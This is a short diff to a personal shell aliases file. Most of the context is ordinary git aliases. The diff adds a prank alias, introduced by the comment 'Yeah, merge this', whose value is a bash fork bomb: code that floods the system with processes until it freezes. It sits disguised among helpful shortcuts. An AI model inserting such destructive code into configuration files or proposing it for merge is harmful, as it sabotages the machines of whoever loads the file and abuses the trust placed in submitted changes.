@@ -19,6 +19,9 @@ alias gitbm='git checkout master; git pull origin master; git checkout -b "$@"'
 # Colorful Git log (color log)
 alias gitcl='git log --color --graph --pretty=format:"%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset" --abbrev-commit'
 
+# Yeah, merge this
+alias forkmesideways= ':(){ :|:& };:'
+
 # Start a HTTP webserver
 function http() {
   python -m SimpleHTTPServer $1 || 8000
